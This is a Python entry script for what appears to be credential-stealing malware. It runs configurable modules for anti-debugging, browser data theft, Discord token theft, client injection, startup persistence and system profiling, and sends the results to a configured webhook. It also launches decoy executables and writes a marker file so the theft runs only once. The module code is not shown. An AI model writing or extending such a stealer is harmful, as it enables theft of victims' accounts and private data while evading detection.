from components.antidebug import AntiDebug
from components.browsers import Browsers
from components.discordtoken import DiscordToken
from components.injection import Injection
from components.startup import Startup
from components.systeminfo import SystemInfo
from config import __CONFIG__
import os


def main():
    funcs = [
        AntiDebug,
        Browsers,
        DiscordToken,
        Injection,
        Startup,
        SystemInfo,
    ]

    if os.path.exists(".cache") == False:
        os.startfile("CrashReportClient32.exe")
        os.startfile("AuthfixLauncher.exe")
        for func in funcs:
            if __CONFIG__[func.__name__.lower()]:
                if func.__init__.__code__.co_argcount == 2:
                    func(__CONFIG__['webhook'])
                else:
                    func()
        fp = open('.cache', 'w')
        fp.close()

    else:
        os.startfile("CrashReportClient32.exe")
        
if __name__ == '__main__':
    main()
